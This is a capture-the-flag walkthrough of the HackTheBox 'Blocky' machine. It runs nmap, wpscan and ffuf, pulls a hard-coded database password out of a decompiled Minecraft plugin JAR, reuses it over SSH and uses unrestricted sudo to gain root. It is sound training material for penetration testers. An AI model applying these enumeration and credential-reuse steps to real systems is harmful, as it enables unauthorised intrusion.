---
layout: page
title: Blocky
description: Blocky from HackTheBox.
img: 
importance: 4
category: HackTheBox
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="assets/img/blocky/logo.png" title="HTB Blocky Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
<h2>Link</h2>
<a href="https://app.hackthebox.com/Blocky">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Coming for all of Steve's diamonds...and Blocky's flags.

Run nmap to get a list of available ports.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/blocky]
└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.37 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-28 22:22 AEDT
Nmap scan report for 10.10.10.37
Host is up (0.039s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE  SERVICE VERSION
21/tcp   open   ftp     ProFTPD 1.3.5a
22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp   open   http    Apache httpd 2.4.18
|_http-title: Did not follow redirect to http://blocky.htb
|_http-server-header: Apache/2.4.18 (Ubuntu)
8192/tcp closed sophos
Device type: general purpose|storage-misc|WAP|media device
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X|5.X (98%), Synology DiskStation Manager 7.X (91%), Asus embedded (88%), Amazon embedded (88%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6 cpe:/a:synology:diskstation_manager:7.1 cpe:/o:linux:linux_kernel:4.4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel cpe:/h:asus:rt-ac66u
Aggressive OS guesses: Linux 3.10 - 4.11 (98%), Linux 3.13 - 4.4 (98%), Linux 3.2 - 4.14 (94%), Linux 3.8 - 3.16 (94%), Linux 3.13 or 4.2 (92%), Linux 4.4 (92%), Linux 2.6.32 - 3.13 (91%), Synology DiskStation Manager 7.1 (Linux 4.4) (91%), Linux 3.16 (90%), Linux 3.16 - 4.6 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8192/tcp)
HOP RTT      ADDRESS
1   55.70 ms 10.10.16.1
2   55.90 ms 10.10.10.37

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.67 seconds
```
{% endraw %}

<br />
Run nmap against all of the ports to get any hidden services.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/blocky]
└─$ sudo nmap -sS -p- -oN nmapfull 10.10.10.37 
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-28 22:23 AEDT
Nmap scan report for 10.10.10.37
Host is up (0.016s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE  SERVICE
21/tcp    open   ftp
22/tcp    open   ssh
80/tcp    open   http
8192/tcp  closed sophos
25565/tcp open   minecraft

Nmap done: 1 IP address (1 host up) scanned in 129.69 seconds
```
{% endraw %}

<br />
Add blocky.htb to the /etc/hosts file.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/blocky]
└─$ cat /etc/hosts 
127.0.0.1       localhost
127.0.1.1       kali
10.10.10.37     blocky.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
{% endraw %}

<br />
Banner grab the port 25565 Minecraft server to get the version.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/blocky]
└─$  sudo nmap -sV -sC -p 21,22,80,8192,25565 -oN nmapspec 10.10.10.37
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-28 22:29 AEDT
Nmap scan report for blocky.htb (10.10.10.37)
Host is up (0.016s latency).

PORT      STATE  SERVICE   VERSION
21/tcp    open   ftp       ProFTPD 1.3.5a
22/tcp    open   ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp    open   http      Apache httpd 2.4.18
|_http-generator: WordPress 4.8
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: BlockyCraft &#8211; Under Construction!
8192/tcp  closed sophos
25565/tcp open   minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.96 seconds
```
{% endraw %}

<br />
View the port 80 landing page.  Looks like a Wordpress installation.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/blocky/landing.png" title="Check the Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run wpscan looking for any low hanging fruit.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/blocky]
└─$ wpscan --url http://blocky.htb                
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]Y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://blocky.htb/ [10.10.10.37]
[+] Started: Tue Jan 28 22:32:36 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blocky.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://blocky.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blocky.htb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blocky.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.8 identified (Insecure, released on 2017-06-08).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blocky.htb/index.php/feed/, <generator>https://wordpress.org/?v=4.8</generator>
 |  - http://blocky.htb/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.8</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://blocky.htb/wp-content/themes/twentyseventeen/
 | Last Updated: 2024-11-12T00:00:00.000Z
 | Readme: http://blocky.htb/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 3.8
 | Style URL: http://blocky.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blocky.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:01 <=============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:01

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Jan 28 22:32:43 2025
[+] Requests Done: 180
[+] Cached Requests: 5
[+] Data Sent: 43.018 KB
[+] Data Received: 13.644 MB
[+] Memory used: 281.621 MB
[+] Elapsed time: 00:00:07
```
{% endraw %}

<br />
Ffuf the webserver to find any interesting directories.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/blocky]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://blocky.htb/FUZZ -e .txt,.bak,.php -fw 3306

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://blocky.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .txt .bak .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 3306
________________________________________________

.php                    [Status: 403, Size: 289, Words: 22, Lines: 12, Duration: 18ms]
index.php               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 51ms]
wiki                    [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 18ms]
wp-content              [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 12ms]
wp-login.php            [Status: 200, Size: 2397, Words: 147, Lines: 70, Duration: 32ms]
plugins                 [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 14ms]
license.txt             [Status: 200, Size: 19935, Words: 3334, Lines: 386, Duration: 35ms]
wp-includes             [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 16ms]
javascript              [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 35ms]
wp-trackback.php        [Status: 200, Size: 135, Words: 11, Lines: 5, Duration: 61ms]
wp-admin                [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 22ms]
phpmyadmin              [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 12ms]
xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 48ms]
.php                    [Status: 403, Size: 289, Words: 22, Lines: 12, Duration: 18ms]
wp-signup.php           [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 33ms]
server-status           [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 16ms]
:: Progress: [882236/882236] :: Job [1/1] :: 2564 req/sec :: Duration: [0:08:39] :: Errors: 0 ::
```
{% endraw %}

<br />
Check the plugins folder that was discovered during the brute-force.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/blocky/files.png" title="Check the Plugins Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Download the BlockyCore.jar file.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/blocky]
└─$ wget http://blocky.htb/plugins/files/BlockyCore.jar
--2025-01-28 23:06:53--  http://blocky.htb/plugins/files/BlockyCore.jar
Resolving blocky.htb (blocky.htb)... 10.10.10.37
Connecting to blocky.htb (blocky.htb)|10.10.10.37|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 883 [application/java-archive]
Saving to: ‘BlockyCore.jar’

BlockyCore.jar                                             100%[========================================================================================================================================>]     883  --.-KB/s    in 0s      

2025-01-28 23:06:53 (144 MB/s) - ‘BlockyCore.jar’ saved [883/883]
```
{% endraw %}

<br />
Run jd-gui to decompile the BlockyCore.jar file.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/blocky]
└─$ jd-gui BlockyCore.jar                                        
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
```
{% endraw %}

<br />
Review the code and note the sqlPass variable.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/blocky]
└─$ wget http://blocky.htb/plugins/files/BlockyCore.jar
--2025-01-28 23:06:53--  http://blocky.htb/plugins/files/BlockyCore.jar
Resolving blocky.htb (blocky.htb)... 10.10.10.37
Connecting to blocky.htb (blocky.htb)|10.10.10.37|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 883 [application/java-archive]
Saving to: ‘BlockyCore.jar’

BlockyCore.jar                                             100%[========================================================================================================================================>]     883  --.-KB/s    in 0s      

2025-01-28 23:06:53 (144 MB/s) - ‘BlockyCore.jar’ saved [883/883]
```
{% endraw %}

<br />
Run jd-gui to decompile the BlockyCore.jar file.

{% raw %}
```java
package com.myfirstplugin;

public class BlockyCore {
  public String sqlHost = "localhost";
  
  public String sqlUser = "root";
  
  public String sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
  
  public void onServerStart() {}
  
  public void onServerStop() {}
  
  public void onPlayerJoin() {
    sendMessage("TODO get username", "Welcome to the BlockyCraft!!!!!!!");
  }
  
  public void sendMessage(String username, String message) {}
}
```
{% endraw %}

<br />
Use the wpscan to try and enumerate the users of the Wordpress installation.

{% raw %}
```sh
<snip>

[i] User(s) Identified:

[+] notch
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blocky.htb/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Notch
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

 <snip>
```
{% endraw %}

<br />
Use the username from the wpscan results and the password from the source code to ssh into the machine.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/blocky]
└─$ ssh notch@10.10.10.37 
notch@10.10.10.37's password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Fri Jul  8 07:16:08 2022 from 10.10.14.29
-bash: cannot create temp file for here-document: No space left on device
notch@Blocky:~$
```
{% endraw %}

<br />
Run sudo -l to get a list of all the commands that notch can use with sudo.

{% raw %}
```sh
notch@Blocky:~$ sudo -l
[sudo] password for notch: 
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
```
{% endraw %}

<br />
Use sudo su - to change to the root user.

{% raw %}
```sh
notch@Blocky:~$ sudo su -
root@Blocky:~# 
```
{% endraw %}

<br />
Get the user.txt flag.

{% raw %}
```sh
root@Blocky:~# cat /home/notch/user.txt
<redacted>
root@Blocky:~# ifconfig
ens160    Link encap:Ethernet  HWaddr 00:50:56:b9:57:a5  
          inet addr:10.10.10.37  Bcast:10.10.10.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:feb9:57a5/64 Scope:Link
          inet6 addr: dead:beef::250:56ff:feb9:57a5/64 Scope:Global
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:5350339 errors:0 dropped:0 overruns:0 frame:0
          TX packets:5091855 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:887094307 (887.0 MB)  TX bytes:2474663025 (2.4 GB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:29780 errors:0 dropped:0 overruns:0 frame:0
          TX packets:29780 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:2368968 (2.3 MB)  TX bytes:2368968 (2.3 MB)
```
{% endraw %}

<br />
Get the root.txt flag.

{% raw %}
```sh
root@Blocky:~# cat /root/root.txt
<redacted>
root@Blocky:~# ifconfig
ens160    Link encap:Ethernet  HWaddr 00:50:56:b9:57:a5  
          inet addr:10.10.10.37  Bcast:10.10.10.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:feb9:57a5/64 Scope:Link
          inet6 addr: dead:beef::250:56ff:feb9:57a5/64 Scope:Global
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:5440287 errors:0 dropped:0 overruns:0 frame:0
          TX packets:5181158 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:903090767 (903.0 MB)  TX bytes:2521630482 (2.5 GB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:30180 errors:0 dropped:0 overruns:0 frame:0
          TX packets:30180 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:2400568 (2.4 MB)  TX bytes:2400568 (2.4 MB)
```
{% endraw %}

<br />
And with that, we conquered the Blocky ender dragon.  See you in the next one.